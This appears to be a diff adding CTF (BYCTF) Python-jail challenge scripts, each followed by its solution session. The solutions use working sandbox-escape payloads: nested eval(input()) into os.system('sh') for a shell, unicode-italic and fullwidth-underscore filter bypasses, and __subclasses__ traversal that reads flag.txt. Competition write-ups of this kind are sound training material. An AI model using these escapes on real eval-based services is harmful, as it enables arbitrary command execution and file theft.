@@ -1,0 +1,88 @@
+'''leet1.py'''
+import re
+
+FLAG = open('flag.txt').read()
+
+inp = input('> ')
+
+if re.search(r'\d', inp) or eval(inp) != 1337:
+    print('Nope')
+else:
+    print(FLAG)
+'''
+$ python3 leet1.py
+> eval(input())
+__import__('os').system('sh')
+$ cat flag.txt	
+BYCTF{fake_flag}
+$
+
+'''leet2.py'''
+import re
+
+FLAG = open('flag.txt').read()
+
+inp = input('> ')
+
+if re.search(r'[123456789]', inp) or re.search(r'\(', inp) or eval(inp) != 1337:
+    print('Nope')
+else:
+    print(FLAG)
+'''
+$ python3 leet2.py 
+> [[help['sh'] for help.__class__.__getitem__ in [help['os'].system]] for help.__class__.__getitem__ in [__import__]]
+$ cat flag.txt
+BYCTF{fake_flag}
+$ 
+
+'''abcdefghijklm.py'''
+inp = input("code > ").lower()
+eval((inp[:4]+__import__("re").sub(r'[a-m]','',inp[4:]))[:80])
+'''
+$ python3 abcdefghijklm.py 
+code > 𝑒𝑣𝑎𝑙(𝑖𝑛𝑝𝑢𝑡())
+__import__('os').system('sh')
+$ cat flag.txt
+BYCTF{fake_flag}
+
+'''nopqrstuvwxyz.py'''
+inp = input("code > ").lower()
+eval((inp[:4]+__import__("re").sub(r'[n-z]','',inp[4:]))[:80])
+'''
+$ python3 nopqrstuvwxyz.py 
+code > 𝑒𝑣𝑎𝑙(𝑖𝑛𝑝𝑢𝑡())
+__import__('os').system('sh')
+$ cat flag.txt
+BYCTF{fake_flag}
+
+'''a-z0-9.py'''
+eval((__import__("re").sub(r'[a-z0-9]','',input("code > ").lower()))[:130])
+'''
+$ python3 a-z0-9.py 
+code > 𝑒𝑣𝑎𝑙(𝑖𝑛𝑝𝑢𝑡())
+__import__('os').system('sh')
+$ cat flag.txt
+BYCTF{fake_flag}
+
+'''b1.py'''
+print(eval(input("code> "), {"__builtins__": {}}, {"__builtins__": {}}))
+'''
+$ python3 b1.py 
+code> ().__class__.__bases__[0].__subclasses__()
+[<class 'type'>, <class 'async_generator'>, <class 'int'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class 'coroutine_wrapper'>, <class 'InterpreterID'>, <class 'managedbuffer'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'types.UnionType'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class 'hamt'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'keys'>, <class 'values'>, <class 'items'>, <class '_contextvars.Context'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Token'>, <class 'Token.MISSING'>, <class 'filter'>, <class 'map'>, <class 'zip'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io._IOBase'>, <class '_io._BytesIOBuffer'>, <class '_io.IncrementalNewlineDecoder'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external._NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Callable'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib._abc.Loader'>, <class 'itertools.accumulate'>, <class 'itertools.combinations'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.takewhile'>, <class 'itertools.islice'>, <class 'itertools.starmap'>, <class 'itertools.chain'>, <class 'itertools.compress'>, <class 'itertools.filterfalse'>, <class 'itertools.count'>, <class 'itertools.zip_longest'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class '_collections._deque_iterator'>, <class '_collections._deque_reverse_iterator'>, <class '_collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>]
+
+$ python3 b1.py 
+code> ().__class__.__bases__[0].__subclasses__()[118].get_data('.','flag.txt')    
+b'BYCTF{fake_flag}\n'
+
+'''b2.py'''
+inp = input("code> ")[:72]
+if "__" in inp:
+    print("Nope")
+else:
+    print(eval(inp, {"__builtins__": {}}, {"__builtins__": {}}))
+'''
+$ python3 b2.py 
+code> ()._＿class_＿._＿bases_＿[0]._＿subclasses_＿()[118].get_data('.','flag.txt')
+b'BYCTF{fake_flag}\n'
+
